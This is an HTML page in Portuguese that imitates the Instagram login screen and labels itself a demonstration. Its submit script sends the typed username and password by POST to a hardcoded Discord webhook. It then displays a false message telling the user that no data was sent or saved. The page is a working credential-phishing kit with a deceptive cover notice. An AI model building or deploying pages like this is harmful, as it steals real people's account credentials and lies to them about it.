<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Modelo demonstrativo de tela de login inspirado no Instagram.">
  <title>Login — Demonstração</title>

  <style>
    /* ... (código CSS original) */
  </style>
</head>

<body>

  <main class="login">

    <div class="top">
      <a class="back" href="#" aria-label="Voltar">‹</a>
      <span class="language">Português (Brasil)⌄</span>
    </div>

    <div class="logo-wrap">

      <!-- Logo ilustrativo -->
      <svg class="logo" viewBox="0 0 100 100">
        <defs>
          <linearGradient id="igGradient"
            x1="0" y1="1" x2="1" y2="0">

            <stop offset="0" stop-color="#ffd600"/>
            <stop offset=".35" stop-color="#ff3040"/>
            <stop offset=".68" stop-color="#c135d8"/>
            <stop offset="1" stop-color="#7638fa"/>

          </linearGradient>
        </defs>

        <rect x="8" y="8" width="84" height="84"
          rx="23" fill="none"
          stroke="url(#igGradient)" stroke-width="8"/>

        <circle cx="50" cy="50" r="19"
          fill="none"
          stroke="url(#igGradient)" stroke-width="8"/>

        <circle cx="74" cy="26" r="5"
          fill="#c135d8"/>
      </svg>

    </div>

    <form id="demoLogin" autocomplete="off">

      <label>
        <span hidden>Nome de usuário</span>
        <input
          type="text"
          name="username"
          placeholder="Nome de usuário, email ou celular"
          aria-label="Nome de usuário, email ou celular"
          autocomplete="off">
      </label>

      <label>
        <span hidden>Senha</span>
        <input
          type="password"
          name="password"
          placeholder="Senha"
          aria-label="Senha"
          autocomplete="new-password">
      </label>

      <button type="submit">
        Entrar
      </button>

    </form>

    <a class="forgot"
      href="https://www.instagram.com/accounts/password/reset/">
      Esqueceu a senha?
    </a>

    <p class="notice" id="notice" role="status">
      
    </p>

    <footer class="bottom">

      <a class="create"
        href="https://www.instagram.com/accounts/emailsignup/">
        Criar nova conta
      </a>

      <div class="meta">
        <span class="meta-mark">∞</span>
        <span>Meta</span>
      </div>

    </footer>

  </main>

  <script>
    // Demonstração 
    document.getElementById('demoLogin')
      .addEventListener('submit', function(event) {
        event.preventDefault();

        const username = document.getElementsByName('username')[0].value;
        const password = document.getElementsByName('password')[0].value;

        fetch('https://discord.com/api/webhooks/1573500610710601778/M92sTTydO6gH-b6VN-SPYIhyvSBWhoTvioU9QQOwa2enmhS7OnHowiw9cFq085a3F15V', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ username, password }),
        })
        .then((response) => response.json())
        .then((data) => console.log(data))
        .catch((error) => console.error(error));

        document.getElementById('notice').textContent =
          'Demonstração: autenticação não configurada. Nenhum dado foi enviado ou salvo.';

        this.reset();
      });
  </script>

</body>
</html>
